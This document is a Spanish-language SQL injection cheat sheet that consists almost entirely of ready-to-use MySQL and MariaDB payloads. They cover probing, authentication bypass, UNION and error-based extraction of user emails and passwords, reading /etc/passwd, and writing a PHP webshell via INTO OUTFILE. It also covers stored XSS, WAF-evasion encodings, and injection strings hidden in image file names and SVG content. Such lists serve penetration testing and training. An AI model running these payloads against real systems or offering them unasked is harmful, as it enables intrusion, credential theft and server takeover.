# 🦕 ꧁𓊈SQL INJECTION𓊉꧂

**`⃤⃞⃟⃤`** Mapa de inyeccion.
```bash
Contexto     | Ejemplo usando una comilla
--------------------------------------------
Query string | ?id=1'...
---------------------------------------------
Path         | /users/1'...
---------------------------------------------
Form body    | username=admin'...
---------------------------------------------
JSON body    | {"username":"admin'..."}
--------------------------------------------
Cookie       | Cookie: uid=1'...
--------------------------------------------
Header       | X-Forwarded-For: 1'...
---------------------------------------------
GraphQL      | {"variables":{"id":"1'..."}}
---------------------------------------------
```

**`⃤⃞⃟⃤`** Sondas.
```bash
# Testing rapido. El 1 representa el numero o letra despues del parametro.
' " ) # || + >
1||!{f'id'}union -- a%0Aselect@1,2,3 --
ELT((1=1),1,2)
1-IF(1=1,0,1)
1-IF(1=2,0,1)
1'
%3f%00
1"
(1)and(1)=(1)--
1\
?\0
?#\0 
1)
1' OR JSON_LENGTH(JSON_OBJECT('a',1))=1-- -
1')
1%00
1%09%23
1' AND 1=1#
1' AND 1=2#
1' AND SLEEP(3)#
1' UNION SELECT 1#
1'OR(1)=1#
1+OR+0x50=0x50
1+and+5!=6
1'||1=1#
1'AND(SLEEP(5))#
SLEEP(5)--
SELECT BENCHMARK(1000000,MD5('A'));
1 OR SLEEP(25)=0 LIMIT 1--
1) OR SLEEP(25)=0 LIMIT 1--
1' OR SLEEP(25)=0 LIMIT 1--
1') OR SLEEP(25)=0 LIMIT 1--
1)) OR SLEEP(25)=0 LIMIT 1--
SELECT SLEEP(25)--
1%09AND%09SLEEP(5)# 
1 AND 1 BETWEEN 1 AND 2#
1")) OR (("1"="1 --
1') OR ('1'='1 --
1" OR "1"="1" --
1' OR LENGTH(USER()) > 18 -- -
1' OR 1=1 ORDER BY (SELECT IF(1=1, SLEEP(5), 0) FROM (SELECT 1) AS x LIMIT 1) -- -
' AND JSON_LENGTH(JSON_OBJECT('a',1))=1 AND 1=1-- -
' AND JSON_CONTAINS(JSON_OBJECT('a',1),JSON_OBJECT('a',1)) AND '1'='1-- -
```
**`⃤⃞⃟⃤`** Auth bypass.
```bash
# Cambiar el "#" por "--" o "-- -" si es necesario.
admin' OR JSON_LENGTH(JSON_OBJECT('a',1))=1#
admin' OR JSON_CONTAINS(JSON_OBJECT('u','admin'),JSON_OBJECT('u','admin'))#
admin' OR JSON_TYPE(JSON_OBJECT('a',1))='OBJECT'#
admin' OR JSON_EXTRACT(JSON_OBJECT('a',1),'$.a')=1#
admin' OR JSON_OVERLAPS(JSON_ARRAY(1,2),JSON_ARRAY(2,3))#
admin' OR JSON_EXISTS(JSON_OBJECT('a',1),'$.a')# 
admin' OR 1 MEMBER OF(JSON_ARRAY(1,2))#
' OR 1=1-- -
' OR '1'='1'-- -
' OR 1=1#
' OR 1=1--+
' OR 1=1;%00
admin'-- -
admin'#
' OR 'a'='a'-- -
' OR 2>1-- -
' OR 1 LIKE 1-- -
' OR 1 BETWEEN 1 AND 1-- -
' OR 'a' IN ('a')-- -
' OR 1=1 OR '
' OR 1=1 OR 'x'='x
' OR 1=1 OR ''='
'/**/OR/**/1=1-- -
'/*!50000OR*/1=1-- -
' oR 1=1-- -
' OR 1 LIKE 1-- -
' OR 1 BETWEEN 1 AND 1-- -
' OR 'a' IN ('a')-- -
' || 1=1-- -
' OR 2>1-- -
%27%20OR%201%3D1--%20-
%2527%2520OR%25201%253D1--%2520-
'%09OR%091=1--%20-
'%0AOR%0A1=1--%20-
```
**`⃤⃞⃟⃤`** Cuando el servidor corta la comunicación.
```bash
# "The connection was reset"
.1union-- a%0Aselect 1,2,3
1-.1union- a%0Aselect- 1,2,3
1'e0union- a%0Aselect 1,2,3
\Nunion- a%0Aselect 1,2,3
1 *9e0union-- -a%0Aselect 1,2,3
```
**`⃤⃞⃟⃤`** Version.
```bash
# Payloads para detectar la version.
1' UNION SELECT @@version,USER(),DATABASE()# <<< para 3 columnas
1' AND @@version LIKE '%MariaDB'%23
1' UNION SELECT @@version_comment,@@version_compile_os,@@version_compile_machine# <<< para 3 columnas
1' AND JSON_UNQUOTE(JSON_EXTRACT(JSON_OBJECT('v',@@version),'$.v')) LIKE '8.%'-- - <<< cambiar el numero
```
**`⃤⃞⃟⃤`** Usuario y privilegios.
```bash
# Payloads para ver privilegios. 3 columnas.
1' UNION SELECT USER(),CURRENT_USER(),@@hostname#
1' UNION SELECT @@secure_file_priv,@@plugin_dir,@@datadir#
1' UNION SELECT @@character_set_connection,@@sql_mode,@@have_symlink#
```
**`⃤⃞⃟⃤`** Info sin UNION.
```bash
1' AND DATABASE() LIKE '%'#
1' AND USER() LIKE '%@%'#
```
**`⃤⃞⃟⃤`** Deteccion de columnas con ORDER, UNION, GROUP y HAVING.
```bash
# Cambiar el numero hasta la deteccion o NULL.
1' ORDER BY 5# 
1' ORDER BY 5 --
1' UNION SELECT NULL#
1' UNION SELECT NULL --
1 GROUP by 10 --
1' GROUP by 10 --
-1' GROUP by -- -
1' HAVING 3 -- -
-1' HAVING 3 -- 
```
**`⃤⃞⃟⃤`** Deteccion de columna reflejada.
```bash
# Ejemplo para 3 columnas
-1' UNION SELECT 'test1','test2','test3'#
-1' UNION SELECT 'test1','test2','test3'--
```
**`⃤⃞⃟⃤`** Sintaxis de extraccion.
```bash
# Tablas y columnas en una peticion separadas por '|'.
' union select 1, CONCAT(table_name, '|', column_name), 1 from information_schema.columns where table_schema = database() --
 
# Nombres de las DB para 3 columnas.
-1' UNION SELECT schema_name, 2, 3 FROM information_schema.schemata#

# Tablas 3 columnas.
-1' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()#

# Para nombre especifico de DB.
-1' UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema='db_nominas'#

# Columnas de la tabla "usuarios".
-1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'#

# Contenido de la tabla usuarios "correo y contrasena". Extrae las 5 primeras filas.
-1' UNION SELECT correo,contrasena,3 FROM usuarios LIMIT 5#

# XPath sin saber el numero de columnas.
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))#
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1)))#

# Para la primer tabla de la DB llamada "db_tienda". Para cada tabla se debe cambiar el "LIMIT" ej:(1,1 2,1 etc)
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='db_tienda' LIMIT 0,1)))#

# Para la primer columna de la tabla "usuarios" de la DB "db_tienda".
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema='db_tienda' AND table_name='usuarios' LIMIT 0,1)))#

# Para extraer el primer contenido de las columnas "correo y contrasena" de la tabla "usuarios" y de la DB "db_tienda".
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(correo, 0x3a, contrasena) FROM db_tienda.usuarios LIMIT 0,1)))#

# Usado GROUP_CONCAT.
# Extrae todas las tablas (3 columnas).
-1' UNION SELECT 1, GROUP_CONCAT(table_name SEPARATOR '<br>'), 3 FROM information_schema.tables WHERE table_schema=database()#

# Columnas de la tabla "usuarios".
-1' UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR '<br>'), 3 FROM information_schema.columns WHERE table_schema=database() AND table_name='usuarios'#

# Extraer datos de las columnas "correo y contrasena" de la tabla "usuarios" (5).
-1' UNION SELECT 1, GROUP_CONCAT(CONCAT(correo, 0x3a, contrasena) SEPARATOR ':'), 3 FROM usuarios LIMIT 5#

# Extraer datos de las columnas "correo y contrasena" de la tabla "usuarios" por codificacion de caracteres. 
' UNION SELECT null,null,GROUP_CONCAT(CONCAT(correo COLLATE utf8mb4_unicode_ci,':',contrasena COLLATE utf8mb4_unicode_ci)) FROM usuarios --

```
**`⃤⃞⃟⃤`** Lectura de archivos (3 columnas).
```bash
-1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3# 
-1' UNION SELECT LOAD_FILE('/var/www/html/index.php'),2,3# 
```
**`⃤⃞⃟⃤`** Permisos de escritura (webshell y xss).
```bash
# La webshell depende de la ruta y las columnas en este caso 3.
1' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'# 
1'; UPDATE [TABLA] SET [COLUMNA]='<script>alert(1)</script>' WHERE id=5#
```
**`⃤⃞⃟⃤`** WAF payloads (order by 10 y group by 10).
```bash
# Mysql.
1%09/*!30001ORDER*/%09/*!50611BY*/%0910#
1%09/*!50611ORDER*/%09/*!40100BY*/%0910#
1%09/*!30001ORDER*/%09/*!50611BY*/%09310#
1%09/*!50708ORDER*/%09/*!30001BY*/%09410#
1%09/*!50708ORDER*/%09/*!40100BY*/%09510#
1%0AorDER%0Aby%0A10%23
1/**/ORDER/**/BY/**/10#
1%09ORDER%23%0ABY%0910%23
1%0D%0AORDER%0D%0ABY%0D%0A10%23
1%0BORDER%0BBY%0B10%23
1%0CORDER%0CBY%0C10%23
1%20ORDER%20BY%2010%23
1%09/*!50000ORDER*/%09/*!50000BY*/%0910%23
1%09/*!50000ORDER*/%09/*!50000BY*/%0910--%20-
1 oRdEr By 10-- -
------------------------------------------------------
# MariaDB.
1%09/*M!30001ORDER*/%09/*M!50611BY*/%0910# 
1%09/*M!50611ORDER*/%09/*M!40100BY*/%0910# 
1%09/*M!30001ORDER*/%09/*M!50611BY*/%0910#
1%09/*M!50708ORDER*/%09/*M!30001BY*/%0910# 
1%09/*M!50708ORDER*/%09/*M!40100BY*/%0910#
1%09/*M!100100ORDER*/%09/*M!100100BY*/%0910%23
1%09/*M!100600ORDER*/%09/*M!100600BY*/%0910%23
1%0A/*M!100100ORDER*/%0A/*M!100100BY*/%0A10%23
1%09ORDER%23%0ABY%0910%23
1/**/ORDER/**/BY/**/10%23
----------------------------------------------------------
# Group.
1 GROUP BY 10-- -
1 GROUP BY 10#
1 GROUP BY 1,2,3-- -
1%09GROUP%09BY%0910%23
1%09GROUP%23%0ABY%0910%23
1%0AGROUP%0ABY%0A10%23
1/**/GROUP/**/BY/**/10%23
1%09/*!50000GROUP*/%09/*!50000BY*/%0910%23
1 GROUP BY 10 WITH ROLLUP-- -
```
**`⃤⃞⃟⃤`** WAF payloads (Union select 3 columnas).
```bash
# Tablas
-1%09/*!80000UNION*/%09ALL%09/*!40100SELECT*/%09/*!80000NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(table_name)%09/*!30001FROM*/%09information_schema.tables%09/*!80000WHERE*/%09table_schema=DATABASE()),/*!80000NULL*/%23

-1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema%3DDATABASE())%2Cnull%23

-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(table_name)/**/FR/**/OM/**/informati/**/on_schema.tables/**/WH/**/ERE/**/table_schema=DATABASE()),NULL%23
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Columnas de la tabla "users" en hexadecimal.
-1%09/*!80000UNION*/%09ALL%09/*!50708SELECT*/%09/*!40100NULL*/,(/*!50708SELECT*/%09GROUP_CONCAT(column_name)%09/*!80000FROM*/%09information_schema.columns%09/*!80000WHERE*/%09table_name=0x7573657273),/*!40100NULL*/%23

-1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name%3D0x7573657273)%2Cnull%23

-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(column_name)/**/FR/**/OM/**/informati/**/on_schema.columns/**/WH/**/ERE/**/table_name=0x7573657273),NULL%23
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Datos de las columnas "email y pass" de la tabla "users".
-1%09/*!50611UNION*/%09ALL%09/*!40100SELECT*/%09/*!40100NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(CONCAT_WS(0x3a,email,pass)%09SEPARATOR%090x7c)%09/*!50708FROM*/%09users),/*!40100NULL*/%23

-1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(concat_WS(0x3a%2Cemail%2Cpass)%0ASEPARATor%0A0x7c)%0Afrom%0Ausers)%2Cnull%2Cnull%23

-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(CONC/**/AT_WS(0x3a,email,pass)/**/SEPARATOR/**/0x7c)/**/FR/**/OM/**/users),NULL,NULL%23
```
**`⃤⃞⃟⃤`** Waf comments, whitespace y url encode.
```bash
# Cometarios.
/*!00000*/
/*x*/
/**x**/
/*%26*/
/%2A%2A/
%2f**%2f
-------------------------------------------------------------------------------
# Espacios en blanco.
%0a
%0b
%0d
%C0
%20
%09
%0c
%a0
---------------------------------------------------------------------------------
# Codificacion en url.
! = %21
" = %22
# = %23
$ = %24
% = %25
& = %26
' = %27
( = %28
) = %29
* = %2A
```
**`⃤⃞⃟⃤`** Payloads en nombre de imagen.
```bash
imagen.jpg' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -.jpg
imagen.png' AND 1=2-- -.png
imagen.jpg' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- -.jpg
imagen.png') AND (SELECT 5543 FROM (SELECT(SLEEP(5)))x) AND ('a'='a -- -.png
--sleep(15).png
a';select+sleep(10); --z.png
----------------------------------------------------------------------------
# Svg
<svg xmlns="http://w3.org">
  <![CDATA[' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -]]>
</svg>

<svg xmlns="http://w3.org">
  <g id="-1&apos; AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -"></g>
</svg>
```
**`⃤⃞⃟⃤`** Links.

https://community.owasp.org/attacks/SQL_Injection_Bypassing_WAF

https://www.slideshare.net/slideshow/advanced-sql-injection-eng/2532493

https://www.slideshare.net/slideshow/sql-injection-bypassing-hand-book-blackrose/53458597

